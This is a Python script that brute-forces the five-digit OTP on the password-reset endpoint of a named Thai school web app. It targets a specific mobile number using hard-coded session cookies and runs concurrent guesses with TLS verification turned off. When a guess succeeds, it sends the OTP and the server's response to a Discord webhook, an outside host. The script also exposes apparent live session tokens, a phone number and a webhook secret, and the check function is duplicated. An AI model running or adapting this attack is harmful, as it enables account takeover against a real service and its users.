
import asyncio
import httpx
import random
import traceback


MOBILE = "0892078160"
REF_CODE = "cxESnU"
URL = "https://webapp.student.co.th/index.php/school/forget_new_mobile_otp/check_otp"
WEBHOOK_URL = "https://discord.com/api/webhooks/1366837555886166179/20tW1XZgncw5RWd1lKgaOtceOmsPc0QB6dMusENn9FTFBkt1m04_b2EK_YBCo7y4KrgH"

HEADERS = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-requested-with": "XMLHttpRequest",
    "cookie": "PHPSESSID=nanqj8v0vl5amuna2q58alj002; LAST_LOGIN_USER_ID_SDC=153590; ci_session=%2BbNSrVcOOdyW0dmq7XtVgCwHSbZVDwTW3T4BI92M6YPkIXNyerMTQnhSCXxYJvqXkRcJX5dbi6IIWKFN9LTm6g7NV5RpkQi12%2FD65EYnfac2g2ryFiJzlZuVSJ%2FCeDbBdeMj4hbgcKDyfKgoAugLB%2FNE4FBM5zsTbkSmVJdXJkqZ8z6zyZvxUwbiqQVf2VLZJkiv0RfjqdKR%2Buoci0y5dl6qnLA4ykIR1LkVWjtM%2FpPco8k72UcnGKpGEbhacJLrMBJUcRPajSa0mK5W7xs%2BFZjvWg5MHadYyS3n4ZfUtP07%2BQjFd2VBn9EVfMjL8mkFgH4JvA3lvgSh53OIPXVzgZx5zBcs47rfqnhXtFp9TLVJOjPkUnpvpwqp8Dz4khXmHGUnbi6PFNe0KlnjZpPa0NcApl57ggP7fNr4B0QOtiJRbuA%2FZJgqSa1eRFiBwowY9ormkLM3pny6KQJeA4g7gCjzlC9DljEeS7O7Xv1CcRdee6jtbFoxzl%2FnGjvcAM5mMXEhZ2YlGiG1i6u%2BPedzqOlBlMuCFvaxBqayHgjWb00%3D",
    "Referer": "https://webapp.student.co.th/index.php/school/forget_new/edit/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
}

TRIED = set()
MAX_OTP = 99999
BATCH_SIZE = 20  # เพิ่มจำนวนยิงต่อรอบ

def generate_unique_otps(count):
    candidates = []
    while len(candidates) < count:
        otp = random.randint(0, MAX_OTP)
        if otp not in TRIED:
            TRIED.add(otp)
            candidates.append(str(otp).zfill(5))
    return candidates

async def send_webhook(otp, data):
    async with httpx.AsyncClient() as client:
        await client.post(WEBHOOK_URL, json={"content": f"✅ OTP FOUND: `{otp}`\n```json\n{data}\n```"})

async def check_otp(client, otp):
    data = {
        "MOBILE": MOBILE,
        "REF_CODE": REF_CODE,
        "CONFIRM_CODE": otp
    }
    try:
        resp = await client.post(URL, headers=HEADERS, data=data)
        content_type = resp.headers.get("content-type", "")
        
        if "application/json" in content_type:
            res = resp.json()
            if res.get("result") or "ไม่ถูกต้อง" not in res.get("message", ""):
                print(f"✅ OTP FOUND: {otp}")
                print(res)
                await send_webhook(otp, res)
                return True
            else:
                print(f"❌ {otp}")
        else:
            print(f"⚠️ Non-JSON response for OTP {otp}:\n{resp.text[:200]}...")
    except Exception as e:
        traceback.print_exc()
        print(f"❗ Error {otp}: {type(e).__name__} - {str(e)}")
    return False
async def check_otp(client, otp):
    data = {
        "MOBILE": MOBILE,
        "REF_CODE": REF_CODE,
        "CONFIRM_CODE": otp
    }
    try:
        resp = await client.post(URL, headers=HEADERS, data=data)
        content_type = resp.headers.get("content-type", "")
        
        if "application/json" in content_type:
            res = resp.json()
            if res.get("result") or "ไม่ถูกต้อง" not in res.get("message", ""):
                print(f"✅ OTP FOUND: {otp}")
                print(res)
                await send_webhook(otp, res)
                return True
            else:
                print(f"❌ {otp}")
        else:
            print(f"⚠️ Non-JSON response for OTP {otp}:\n{resp.text[:200]}...")
    except Exception as e:
        traceback.print_exc()
        print(f"❗ Error {otp}: {type(e).__name__} - {str(e)}")
    return False


async def brute_force():
    limits = httpx.Limits(max_keepalive_connections=500, max_connections=500)
    async with httpx.AsyncClient(timeout=3.0, limits=limits, verify=False, follow_redirects=False) as client:
        while len(TRIED) < MAX_OTP:
            otps = generate_unique_otps(BATCH_SIZE)
            tasks = [check_otp(client, otp) for otp in otps]
            results = await asyncio.gather(*tasks)
            if any(results):
                break
            await asyncio.sleep(1)  # Sleep for 100ms to avoid overwhelming the server
            # no sleep = go max speed

if __name__ == "__main__":
    asyncio.run(brute_force())
